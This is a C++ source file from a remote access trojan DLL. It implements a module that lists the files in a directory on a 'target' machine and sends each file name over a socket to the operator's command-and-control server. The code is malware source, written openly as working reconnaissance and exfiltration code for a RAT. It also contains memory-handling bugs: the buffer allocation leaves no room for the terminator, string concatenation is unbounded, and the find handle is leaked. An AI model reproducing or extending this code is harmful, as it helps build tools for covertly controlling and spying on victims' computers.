// Patrick Sacchet (@pjsacchet)
// Verison 1.0.
// RAT-Dll-DirList.cpp : Defines functionality for performing a dir list on target, i.e., returning a list of files within a certain directory to our C2

#include "RAT-Dll-Connect.h"
#include "RAT-Dll-DirList.h"


/** This function will perform a simple dir list for us
params:
* dirPath - path to the directory we want to list
* dirFiles - array holding each of our file names
* numDirFiles - number of files in our array
return:
* if successful we return SUCCESS; otherwise print error code and handle appropiately
*/
INT performDirList(__in char* dirPath, __inout char*** dirFiles, __inout UINT32* numDirFiles)
{
	INT status = SUCCESS;
	UINT32 numFiles = 0, currIndex = 0;
	WIN32_FIND_DATAA foundData;
	CHAR outputMessage[DEFAULT_BUF_LEN];
	char** dirFilesRet = NULL;
	HANDLE hFind = INVALID_HANDLE_VALUE;

	// Modify string so its an actual directory
	strncat(dirPath, "\\*", 3);

	// First pass will be so we can properly allocate our buffer for number of files we have
		// TODO: is there really not a better way of getting the number of files in a directory...
	hFind = FindFirstFileA(dirPath, &foundData);
	if (hFind == INVALID_HANDLE_VALUE)
	{
		OutputDebugStringA("RAT-Dll-DirList::performDirList - Failed FindFirstFile\n");
		goto cleanup;
	}

	do
	{
		numFiles += 1;
	} while (FindNextFileA(hFind, &foundData) != 0);

	// Second pass will be to actually store the files we found
		// NOTE: if the target user somehow adds or deletes files between this first and second pass there may not be enough allocated memory
	dirFilesRet = (char**)malloc(sizeof(char*) * numFiles);
	if (dirFilesRet == NULL)
	{
		OutputDebugStringA("RAT-Dll::performDirList - Failed malloc; insufficient memory!\n");
		goto cleanup;
	}

	*numDirFiles = numFiles;

	sprintf_s(outputMessage, "RAT-DLL-DirList::performDirList - Found %i files!\n", numFiles);
	OutputDebugStringA(outputMessage);

	hFind = FindFirstFileA(dirPath, &foundData);
	if (hFind == INVALID_HANDLE_VALUE)
	{
		OutputDebugStringA("RAT-Dll::performDirList - Failed FindFirstFile\n");
		goto cleanup;
	}

	do
	{
		sprintf_s(outputMessage, "RAT-DLL-DirList::performDirList - Found %s in dir\n", foundData.cFileName);
		OutputDebugStringA(outputMessage);
		// Store the file name
			// TODO: fix these gross casts
		dirFilesRet[currIndex] = (char*)malloc(sizeof(char) * strlen((char*)foundData.cFileName));
		if (dirFilesRet[currIndex] == NULL)
		{
			OutputDebugStringA("RAT-Dll::performDirList - Failed malloc; insufficient memory!\n");
			goto cleanup;
		}
		strcpy(dirFilesRet[currIndex], (char*)foundData.cFileName);
		currIndex++;
	} while (FindNextFileA(hFind, &foundData) != 0);

	*dirFiles = dirFilesRet;


cleanup:
	return status;
}

/** This function will send our files we've collected from our dir list to our C2
params:
* clientSock - current open socket to our C2
* dirFiles - array holding each of our file names
* numDirFiles - number of files in our array
return:
* if successful we return SUCCESS; otherwise print error code and handle appropiately
*/
INT sendDirFiles(__inout SOCKET clientSock, __in char** dirFiles, __in UINT32 numDirFiles)
{
	INT status = SUCCESS;
	UINT32 index = 0;
	CHAR msgBuf[DEFAULT_BUF_LEN];
	char* fileName = NULL;

	sprintf_s(msgBuf, "RAT-Dll-DirList::sendDirFiles - Preparing to send %i files back to C2...\n", numDirFiles);
	OutputDebugStringA(msgBuf);

	while (index < numDirFiles)
	{
		fileName = dirFiles[index];

		sprintf_s(msgBuf, "RAT-Dll-DirList::sendDirFiles - Sending %s... size %i\n", fileName, strlen(fileName));
		OutputDebugStringA(msgBuf);

		status = send(clientSock, fileName, strlen(fileName), 0);
		if (status == SOCKET_ERROR)
		{
			sprintf_s(msgBuf, "RAT-Dll-DirList::sendDirFiles - Failure recevied from send (status code) %d\n", WSAGetLastError());
			OutputDebugStringA(msgBuf);
			status = WSAGetLastError();
			goto cleanup;
		}

		Sleep(1000);

		index++;
	}

	OutputDebugStringA("RAT-Dll-DirList::sendDirFiles - Sent files! Cleaning up...\n");

	// Should free memory stuff here too 
	index = 0;
	while (index < numDirFiles)
	{
		free(dirFiles[index]);
		index++;
	}

	free(dirFiles);

	// Currently our status is set to the number of bytes returned so make sure we're actually successful
	status = SUCCESS;


cleanup:
	return status;
}